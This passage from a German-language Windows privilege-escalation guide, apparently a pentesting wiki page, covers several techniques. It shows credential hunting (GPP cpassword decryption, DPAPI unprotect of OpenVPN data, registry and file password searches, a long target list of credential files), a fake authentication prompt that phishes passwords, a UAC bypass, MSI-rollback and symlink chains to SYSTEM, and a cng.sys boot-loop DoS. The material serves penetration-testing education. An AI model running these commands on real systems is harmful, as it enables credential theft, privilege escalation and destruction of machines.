Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem nicht leeren "cpassword"-Feld durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei und hilft so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Mit crackmapexec die Passwörter erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldedaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Anmeldedaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Anmeldedaten fragen

Du kannst den Benutzer immer **bitten, seine Anmeldedaten oder sogar die Anmeldedaten eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass das **direkte Fragen** des Clients nach den **Anmeldedaten** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die Credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **Passwörter** in **Klartext** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Bitte durchsuchen Sie alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Du solltest auch den Bin überprüfen, um darin nach Credentials zu suchen

Um von mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Other possible registry keys with credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**openssh-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Du solltest nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise ebenfalls einige **Passwörter gespeichert sind**.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine class ID (CLSID)** identifiziert, und jede Komponente stellt Funktionalität über eine oder mehrere Interfaces bereit, die über interface IDs (IIDs) identifiziert werden.

COM-Klassen und Interfaces sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry wird durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** erstellt.

Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **default value** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../images/image (729).png>)

Grundsätzlich könntest du, wenn du **eine beliebige der DLLs überschreiben** kannst, die ausgeführt werden sollen, **Rechte ausweiten**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Suche in der Registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** Plugin, das ich erstellt habe. Dieses Plugin führt automatisch jedes metasploit POST-Modul aus, das innerhalb des Opfers nach credentials sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die passwords enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um passwords aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess öffnet** (`OpenProcess()`) **mit vollem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Privilegien, aber unter Vererbung aller offenen Handles des Hauptprozesses**.\
Wenn du dann **vollen Zugriff auf den niedrig privilegierten Prozess** hast, kannst du den **offenen Handle zum erstellten privilegierten Prozess** mit `OpenProcess()` greifen und **eine shellcode injizieren**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Geteilte Speichersegmente, bezeichnet als **pipes**, ermöglichen Prozesskommunikation und Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, die es voneinander unabhängigen Prozessen erlaubt, Daten zu teilen, sogar über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur, mit den Rollen **named pipe server** und **named pipe client**.

Wenn Daten durch eine pipe von einem **client** gesendet werden, hat der **server**, der die pipe eingerichtet hat, die Möglichkeit, die **Identität** des **client** zu **übernehmen**, vorausgesetzt, er besitzt die nötigen **SeImpersonate**-Rechte. Das Identifizieren eines **privileged process**, der über eine pipe kommuniziert, die du nachahmen kannst, bietet die Gelegenheit, **höhere Privilegien zu erlangen**, indem du die Identität dieses Prozesses übernimmst, sobald er mit der von dir eingerichteten pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem erlaubt das folgende Tool, **eine named pipe communication mit einem Tool wie burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt es, alle pipes aufzulisten und anzuzeigen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Server-Modus stellt `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter authentifizierter Client kann den mailslot-basierten Async-Event-Pfad missbrauchen, um `ClientAttach` in einen beliebigen **4-byte write** auf jede vorhandene Datei umzuwandeln, die für `NETWORK SERVICE` schreibbar ist, und anschließend Telephony-Admin-Rechte erlangen und eine beliebige DLL als Dienst laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser` auf einen schreibbaren vorhandenen Pfad gesetzt → der Dienst öffnet ihn über `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für Async-Event-Writes.
- Jedes Event schreibt das vom Angreifer kontrollierte `InitContext` aus `Initialize` auf dieses Handle. Registriere eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), triggere `TRequestMakeCall` (`Req_Func 121`), hole es über `GetAsyncEvents` (`Req_Func 0`) ab und deregistriere/beende anschließend, um deterministische Writes zu wiederholen.
- Füge dich selbst zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, verbinde dich erneut und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder ein registriertes Scheme) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wenn man eine Shell als Benutzer erhält, kann es geplante Tasks oder andere Prozesse geben, die ausgeführt werden und **Anmeldedaten in der Command Line übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Command Lines von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen, wobei alle Unterschiede ausgegeben werden.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (per Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess als "NT\AUTHORITY SYSTEM" aus einem nicht privilegierten Benutzer heraus zu starten.

Dadurch ist es möglich, Privilegien zu erhöhen und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Zusätzlich muss nichts installiert werden, und die während des Prozesses verwendete Binary ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, ist es notwendig, die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lies dies, um **über Integrity Levels zu lernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Dann **lies dies, um über UAC und UAC bypasses zu lernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von Arbitrary Folder Delete/Move/Rename zu SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion von Windows Installer zu missbrauchen, um legitime Dateien während des Deinstallationsprozesses durch schädliche zu ersetzen. Dafür muss der Angreifer einen **malicious MSI Installer** erstellen, der zum Hijacking des Ordners `C:\Config.Msi` verwendet wird. Dieser wird später von Windows Installer genutzt, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so verändert wurden, dass sie den malicious payload enthalten.

Die zusammengefasste Technik ist die folgende:

1. **Stufe 1 – Vorbereitung auf das Hijacking (`C:\Config.Msi` leer lassen)**

- Schritt 1: Installiere das MSI
- Erstelle ein `.msi`, das eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, damit ein **non-admin user** ihn ausführen kann.
- Halte nach der Installation einen **handle** auf die Datei offen.

- Schritt 2: Deinstallation starten
- Deinstalliere dasselbe `.msi`.
- Der Deinstallationsprozess beginnt damit, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll den offenen Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Custom Syncing
- Das `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)** die:
- Signalisiert, wenn `.rbf` geschrieben wurde.
- Wartet dann auf ein weiteres Event, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen von `.rbf` blockieren
- Wenn signalisiert wird, öffne die `.rbf`-Datei ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht werden kann**.
- Signalisiere dann zurück, damit die Deinstallation beendet werden kann.
- Windows Installer schafft es nicht, die `.rbf` zu löschen, und weil nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
- Du (der Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit für das Hijacking.

> An diesem Punkt **trigger die SYSTEM-level arbitrary folder delete vulnerability**, um `C:\Config.Msi` zu löschen.

2. **Stufe 2 – Rollback-Skripte durch schädliche ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F) und **halte einen handle offen** mit `WRITE_DAC`.

- Schritt 7: Andere Installation ausführen
- Installiere das `.msi` erneut, mit:
- `TARGETDIR`: Schreibbarer Speicherort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird benutzt, um wieder **rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` überwachen
- Nutze `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis ein neues `.rbs` erscheint.
- Erfasse den Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
- Das `.msi` enthält eine **custom install action (`SyncBeforeRollback`)** die:
- Ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- Dann vor dem Fortfahren wartet.

- Schritt 10: Schwache ACL erneut anwenden
- Nach Empfang des `.rbs created`-Events:
- Der Windows Installer **wendet starke ACLs erneut** auf `C:\Config.Msi` an.
- Da du aber weiterhin einen handle mit `WRITE_DAC` hast, kannst du **schwache ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen des handles erzwungen**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
- Überschreibe die `.rbs`-Datei mit einem **gefälschten rollback script**, das Windows anweist:
- Deine `.rbf`-Datei (malicious DLL) in einen **privilegierten Speicherort** zu restaurieren (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` mit einer **malicious SYSTEM-level payload DLL** ab.

- Schritt 12: Rollback auslösen
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass sie die Installation **absichtlich an einem bekannten Punkt fehlschlagen** lässt.
- Dadurch beginnt der **rollback**.

- Schritt 13: SYSTEM installiert deine DLL
- Windows Installer:
- Liest deine malicious `.rbs`.
- Kopiert deine `.rbf`-DLL in den Zielpfad.
- Jetzt hast du deine **malicious DLL in einem SYSTEM-loaded path**.

- Letzter Schritt: SYSTEM-Code ausführen
- Starte eine vertrauenswürdige **auto-elevated binary** (z. B. `osk.exe`), die die DLL lädt, die du hijacked hast.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von Arbitrary File Delete/Move/Rename zu SYSTEM EoP

Die Haupttechnik mit MSI-Rollback (die vorherige) setzt voraus, dass du einen **kompletten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Schwachstelle nur **arbitrary file deletion** erlaubt?

Du könntest die **NTFS internals** ausnutzen: Jeder Ordner hat einen versteckten Alternate Data Stream namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners **löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Du kannst das mit standardmäßigen Dateilösch-APIs tun, wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, **löscht sie den Ordner selbst**.

### Von Folder Contents Delete zu SYSTEM EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber es **erlaubt das Löschen des Inhalts eines vom Angreifer kontrollierten Ordners**?

1. Schritt 1: Einen Köder-Ordner und eine Köder-Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess scannt Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock-Callbacks – das Löschen umleiten

- Option A: `file1.txt` anderswohin verschieben
- Dadurch wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: `folder1` in eine **junction** umwandeln:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den internen NTFS-Stream, der die Ordner-Metadaten speichert — wenn man ihn löscht, wird der Ordner gelöscht.

5. Schritt 5: Den oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aber jetzt wird aufgrund von junction + symlink tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu Permanent DoS

Nutze eine Primitive aus, die es dir erlaubt, **einen beliebigen Ordner als SYSTEM/admin zu erstellen** — selbst wenn du **keine Dateien schreiben** oder **schwache Berechtigungen setzen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Mode-Driver `cng.sys`.
- Wenn du ihn **vorab als Ordner anlegst**, kann Windows den tatsächlichen Driver beim Booten nicht laden.
- Dann versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den tatsächlichen Driver nicht auflösen** und **stürzt ab oder bleibt beim Booten hängen**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Zugriff auf die Disk).

### Von privilegierten Log/Backup-Pfaden + OM symlinks zu beliebigem Datei-Overwrite / Boot DoS

Wenn ein **privileged service** Logs/Exports in einen Pfad schreibt, der aus einer **beschreibbaren config** gelesen wird, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein beliebiges Overwrite zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Voraussetzungen**
- Config, die den Zielpfad speichert, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen mount point zu `\RPC Control` und einen OM file symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Report).

**Beispielkette**
1. Lies die config aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte darauf, dass die privilegierte Komponente das Log schreibt (z. B. löst der Admin „send test SMS“ aus). Der Schreibvorgang landet jetzt in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschreibene Ziel (Hex/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Dies lässt sich auch auf jede geschützte Datei verallgemeinern, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise von `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann diese zuerst versucht werden, wodurch es zu einem zuverlässigen DoS-Ziel für beschädigte Daten wird.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High Integrity-Prozess ausführst, kann der **Pfad zu SYSTEM** einfach sein, indem du einfach **einen neuen Dienst erstellst und ausführst**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wenn du eine service binary erstellst, stelle sicher, dass es ein gültiger service ist oder dass die binary die notwendigen Aktionen schnell genug ausführt, da sie nach 20s beendet wird, wenn es kein gültiger service ist.

### AlwaysInstallElevated

Aus einem High Integrity-Prozess könntest du versuchen, die **AlwaysInstallElevated registry entries zu aktivieren** und eine reverse shell mit einem _**.msi**_-Wrapper zu **installieren**.\
[Weitere Informationen über die beteiligten registry keys und wie man ein _.msi_-Paket hier installiert.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese token privileges hast (wahrscheinlich findest du das in einem bereits High Integrity-Prozess), wirst du in der Lage sein, **fast jeden Prozess zu öffnen** (nicht protected processes) mit dem SeDebug privilege, das **Token zu kopieren**, und einen **beliebigen Prozess mit diesem Token zu erstellen**.\
Mit dieser Technik wird normalerweise **jeder Prozess ausgewählt, der als SYSTEM mit allen token privileges läuft** (_ja, du kannst SYSTEM processes ohne alle token privileges finden_).\
**Du kannst ein** [**Codebeispiel für die Ausführung der vorgeschlagenen Technik hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **eine pipe zu erstellen und dann einen service zu erstellen/missbrauchen, der in diese pipe schreibt**. Danach kann der **server**, der die pipe mit dem **`SeImpersonate`** privilege erstellt hat, **das token des pipe clients** (des service) **impersonaten** und SYSTEM privileges erhalten.\
Wenn du [**mehr über name pipes erfahren willst, solltest du das hier lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen willst, [**wie man von high integrity zu System mit name pipes kommt, solltest du das hier lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

